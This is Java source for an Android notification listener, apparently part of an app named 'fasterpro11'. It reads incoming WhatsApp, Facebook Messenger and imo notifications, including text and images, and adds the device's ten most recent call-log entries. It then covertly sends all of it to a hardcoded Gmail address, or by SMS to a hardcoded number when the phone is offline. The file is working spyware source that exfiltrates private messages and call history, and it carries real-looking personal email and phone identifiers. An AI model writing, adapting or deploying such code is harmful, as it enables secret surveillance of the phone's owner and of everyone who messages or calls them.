package com.example.fasterpro11;

import android.app.Notification;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.util.Log;

import com.example.fasterpro11.DateUtils;
import com.example.fasterpro11.JavaMailAPISendNotification;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.mail.MessagingException;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotificationListener";

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    private static final String IMO_PACKAGE = "com.imo.android.imoim";
    private static final String MESSENGER_PACKAGE = "com.facebook.orca";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";

    // Map to store the last forwarded message for each package
    private final Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();

    private static class ForwardedMessage {
        String message;
        long timestamp;

        ForwardedMessage(String message, long timestamp) {
            this.message = message;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) {
            return;
        }

        Bundle extras = notification.extras;
        CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
        Bitmap largeIcon = extras.getParcelable(Notification.EXTRA_LARGE_ICON);
        Bitmap picture = extras.getParcelable(Notification.EXTRA_PICTURE);

        if (title != null && (text != null || picture != null)) {
            String packageName = sbn.getPackageName();
            if (packageName.equals(IMO_PACKAGE) || packageName.equals(MESSENGER_PACKAGE) || packageName.equals(WHATSAPP_PACKAGE)) {
                String currentMessage = title.toString() + " " + (text != null ? text.toString() : "");

                // Check if the message was forwarded within the last 2 minutes
                if (shouldForwardNotification(packageName, currentMessage)) {
                    if (isInternetConnected()) {
                        forwardNotificationByEmail(packageName, title.toString(), text != null ? text.toString() : "", largeIcon);
                    } else if (shouldForwardBySMS(currentMessage)) {
                        forwardNotificationBySMS(packageName, title.toString(), text != null ? text.toString() : "");
                    } else {
                        Log.d(TAG, "Notification not forwarded due to conditions not met");
                    }

                    // Update the last forwarded message for the package
                    lastForwardedMessageMap.put(packageName, new ForwardedMessage(currentMessage, System.currentTimeMillis()));
                } else {
                    Log.d(TAG, "Notification not forwarded because the same message was recently sent");
                }
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle notification removal if needed
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
        return false;
    }

    private boolean shouldForwardBySMS(String message) {
        return !isInternetConnected() &&
                (containsFiveDigitNumber(message) || isSpecificSMSRecipient(message));
    }

    private boolean containsFiveDigitNumber(String message) {
        // Check if the message contains any five-digit number prefixed with a plus sign
        return message.matches(".*\\+\\d{4}.*");
    }

    private boolean isSpecificSMSRecipient(String message) {
        // Check if the message indicates it's from GP or specific SMS recipient number
        return message.contains("GP") || message.contains("+8801304039289");
    }

    private void forwardNotificationByEmail(String app, String title, String text, Bitmap image) {
        try {
            String recipientEmail = "abontiangum99@gmail.com"; // Replace with recipient's email address
            String subject = "Notification from " + app;
            String messageBody = "Title: " + title + "\nMessage: " + text;

            // Append call logs to message body
            messageBody += "\n\nRecent Call Logs:\n" + getRecentCallLogs();

            JavaMailAPISendNotification.sendMail(recipientEmail, subject, messageBody, image);
            Log.d(TAG, "Notification forwarded successfully via email");
        } catch (MessagingException e) {
            Log.e(TAG, "Failed to forward notification: " + e.getMessage());
        }
    }

    private void forwardNotificationBySMS(String app, String title, String text) {
        String smsRecipient = "+8801748937893";  // Replace with your SMS recipient number
        String smsMessage = "Notification from " + app + "\nTitle: " + title + "\nMessage: " + text;

        // Append call logs to SMS message
        smsMessage += "\n\nRecent Call Logs:\n" + getRecentCallLogs();

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(smsRecipient, null, smsMessage, null, null);
        Log.d(TAG, "Notification forwarded successfully via SMS");
    }

    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };
        Cursor cursor = getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            do {
                String number = cursor.getString(numberIndex);
                long date = cursor.getLong(dateIndex);
                String duration = cursor.getString(durationIndex);
                int type = cursor.getInt(typeIndex);
                String callType = "Unknown";
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "Incoming";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "Outgoing";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "Missed";
                        break;
                }
                callLogBuilder.append("Number: ").append(number).append(", Type: ").append(callType)
                        .append(", Duration: ").append(duration).append(", Date: ").append(DateUtils.dateToString(date)).append("\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        return callLogBuilder.toString();
    }

    private boolean shouldForwardNotification(String packageName, String currentMessage) {
        // Check if there is a previous forwarded message for this package
        if (lastForwardedMessageMap.containsKey(packageName)) {
            ForwardedMessage lastForwardedMessage = lastForwardedMessageMap.get(packageName);
            // Compare the current message with the last forwarded message
            return !currentMessage.equals(lastForwardedMessage.message) || (System.currentTimeMillis() - lastForwardedMessage.timestamp) > 120000; // 120000 milliseconds = 2 minutes
        }
        // If no previous message, it should be forwarded
        return true;
    }


}
